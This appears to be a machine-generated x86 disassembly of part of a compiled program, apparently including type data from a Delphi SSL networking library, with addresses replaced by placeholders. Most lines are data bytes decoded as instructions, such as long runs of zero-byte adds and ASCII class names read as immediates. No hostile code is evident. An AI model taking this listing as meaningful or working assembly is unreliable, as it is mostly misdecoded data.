add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + eax * 2 ] bh
mov ah 0x0
mov al 0x7b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1800467b ] dh
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x6a ] bl
inc esi
add [ esp + edx * 2 ] cl
dec ecx
push ebx
push ebx
dec esp
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffffac000000 ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
imul esi [ eax + 0x68 ] 0x694c7265
jae r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
jns r-xdata
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + edx + 0x200040 ] ch
inc eax
add [ esp + edi * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
and [ eax ] al
add [ eax + eax ] bl
lea eax [ eax ]
and al 0x7b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7b ] dl
inc esi
add [ eax ] bh
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esi [ edx + 0x73 ] r-xdata
sub_467d70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x7e
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jle r-xdata
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x77 ] bl
inc esi
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add al ah
mov [ esi ] eax
cwde
mov al [ esi ]
and [ ebx - 0x748bffba ] cl
inc esi
add [ eax + 0x1500468b ] dl
push esp
dec ecx
push ebx
jb r-xdata
add [ eax - 0x54000000 ] dl
xor eax 0xb0b40046
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x50004689 ] ah
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0003 ] al
dec edi
dec eax
popad
outsb
insb
jb r-xdata
or al 0x11
inc eax
add [ eax ] al
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
inc eax
jae r-xdata
jns r-xdata
imul ebp [ edi + 0x6e ] 0x46783c73
push ebx
dec esp
dec edi
jo r-xdata
push ebx
push ebx
dec esp
mov eax eax
and al 0x7e
inc esi
add [ edi ] al
adc eax 0x53644954
jb r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ esi ] 0xc
add [ eax ] al
add [ eax ] dh
xchg ebx eax
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
dec edi
jo r-xdata
outsb
push ebx
push ebx
dec esp
add [ eax ] al
mov eax eax
mov esp 0x467f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 + 0x80046 ] bh
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x64 ] bh
inc esi
add [ esp + edx * 2 ] cl
dec ecx
push ebx
push ebx
dec esp
inc ebx
imul esi [ eax + 0x68 ] 0x408d7265
add [ eax ] bl
jb r-xdata
outsb
outsw
js r-xdata
dec ecx
pop eax
xor eax 0x7f4c3930
inc esi
add [ edi ] al
pop es
push esp
dec ecx
pop eax
lodsb [ esi ]
fwait
inc esi
add [ edi ] al
push esp
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or al 0x4f
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jb r-xdata
outsb
push ebx
push ebx
dec esp
inc ebp
jb r-xdata
xor eax 0x7f3c3930
inc esi
add [ ecx + edx ] cl
cmp al 0x7f
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7f ] al
inc esi
jg r-xdata
popad
jae r-xdata
add [ eax ] bh
add bh bh
js r-xdata
cmp al 0x78
inc esi
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi ] 0xc
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x80
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
outsd
jb r-xdata
add ah dh
fwait
inc esi
add [ ebx + ebx * 4 + 0x54070046 ] ch
ja r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0c0004 ] al
push ebx
dec esp
mov eax 0x5000467d
inc esi
add [ edi ] al
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
dec edi
jo r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451d0040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esi
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 + 0x46 ] dh
add [ eax + eax ] cl
add [ eax ] al
int3
xor al [ eax ]
hlt
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0005 ] al
outsb
inc edi
je r-xdata
outsb
push ebx
push ebx
dec esp
add al 0x0
push 0x6c004679
add [ eax ] al
[ eax + eax ]
outsb
push ebx
push ebx
dec esp
dec esp
outsd
popad
inc ebp
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
outsd
je r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45110040 ] al
int3
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
rol [ eax - 0x7f ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7f ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
nop
js r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
jne r-xdata
shl [ eax + 0x4681 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004681 ]
add [ eax ] al
add ah cl
jg r-xdata
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0006 ] al
outsb
push esi
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
inc ebp
jb r-xdata
push edx
outsd
outsd
outsb
inc ebx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0xc0046 ] al
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
outsd
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
rol [ edx + eax * 4 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
pushfd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0xc0046 ] bl
add [ eax ] al
int3
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451b0040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ esi ] 0xc
add [ eax ] al
add ah cl
jg r-xdata
outsd
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x82
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45190040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
push ebx
je r-xdata
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45160040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x46 ] ch
add [ eax + eax ] cl
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
push 0x4684
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] ch
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
imul ebp [ esi + 0x67 ] 0x68706943
jb r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
jb r-xdata
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc004684
add [ eax ] al
add ah cl
jg r-xdata
outsd
jb r-xdata
push sub_4685c0
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4684 0x0
outsd
jb r-xdata
or al 0x0
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ esi ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45120040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ecx
popad
imul ebp [ fs : esi + 0x67 ] 0x4579654b
jb r-xdata
rol [ esp + eax * 4 ] 0x46
add [ eax ] al
add [ eax ] al
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4260b8
xor eax eax
push ebp
push sub_46859e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404050
mov ebx [ ebp + 0x14 ]
mov esi [ ebx + 0x34 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
rol [ ebp - 0x9bffba ] 0x30
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ ebp - 0x8 ]
call sub_404310
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_40435c
mov eax [ ebp - 0xc ]
call sub_404510
mov edx eax
lea ecx [ ebx + 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_408698
mov [ ebp - 0x4 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685a5
mov eax [ rw-data ]
call sub_4260c0
retn
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
inc esp
popad
je r-xdata
enter 0x4684 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_468053
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
dec esi
outsd
je r-xdata
outsb
push ebx
push ebx
dec esp
dec esp
outsd
popad
inc ebp
jb r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45110040 ] al
outsd
popad
push ebx
push ebx
dec esp
dec esp
imul esp [ edx + 0x72 ] 0x8b797261
rol [ eax - 0x7f ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7f ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi ] 0xc
outsd
jb r-xdata
dec edi
push ebx
push ebx
dec esp
inc edi
je r-xdata
je r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
dec edi
jo r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451d0040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
outsd
xor al [ eax ]
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ ebx ] bl
inc ebp
dec ecx
dec edi
push ebx
push ebx
dec esp
inc ebx
jb r-xdata
je r-xdata
jne r-xdata
shl [ eax + 0x4681 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004681 ]
add [ eax ] al
add ah cl
jg r-xdata
outsd
je r-xdata
dec esi
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x746f6f52
inc ebx
popad
je r-xdata
je r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
inc ebp
jb r-xdata
push edx
outsd
outsd
outsb
inc ebx
outsd
outsb
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0xc0046 ] al
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
outsd
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
popad
imul ebp [ fs : esi + 0x67 ] 0x74726543
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add [ esi ] 0xc
add [ eax ] al
add [ eax ] ch
add [ esi ] 0xc4
xor al 0x40
inc ebp
jb r-xdata
dec ecx
dec edi
push ebx
push ebx
dec esp
dec ebp
outsd
dec esi
rol [ edx + eax * 4 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x74726543
pushfd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0xc0046 ] bl
add [ eax ] al
int3
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451b0040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ esi ] 0xc
add [ eax ] al
add ah cl
jg r-xdata
outsd
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x82
inc esi
add [ eax + eax ] cl
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45190040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
push ebx
je r-xdata
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45160040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
dec esp
outsd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x46 ] ch
add [ eax + eax ] cl
add [ eax ] al
sub [ eax + 0x34c40046 ] al
inc eax
push 0x4684
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] ch
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
imul ebp [ esi + 0x67 ] 0x68706943
jb r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
dec ecx
dec edi
push ebx
push ebx
dec esp
jb r-xdata
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] 0x45676e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc004684
add [ eax ] al
add ah cl
jg r-xdata
outsd
jb r-xdata
push sub_4685c0
push [ fs : eax ]
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4684 0x0
outsd
jb r-xdata
or al 0x0
add [ eax ] al
int3
add [ eax ] al
